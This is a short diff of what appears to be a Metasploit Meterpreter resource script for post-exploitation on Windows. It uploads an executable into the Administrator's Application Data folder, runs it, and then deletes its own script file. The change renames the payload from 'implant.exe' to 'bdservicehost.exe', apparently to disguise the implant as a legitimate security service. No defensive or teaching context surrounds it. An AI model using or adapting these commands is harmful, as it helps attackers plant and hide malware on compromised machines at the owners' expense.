@@ -1,4 +1,4 @@
-upload -c implant.exe "C:/Documents and Settings/Administrator/Application Data/implant.exe"
-execute -f "C:/Documents and Settings/Administrator/Application Data/implant.exe"
+upload -c bdservicehost.exe "C:/Documents and Settings/Administrator/Application Data/bdservicehost.exe"
+execute -f "C:/Documents and Settings/Administrator/Application Data/bdservicehost.exe"
 rm upload_exe.rc
 exit
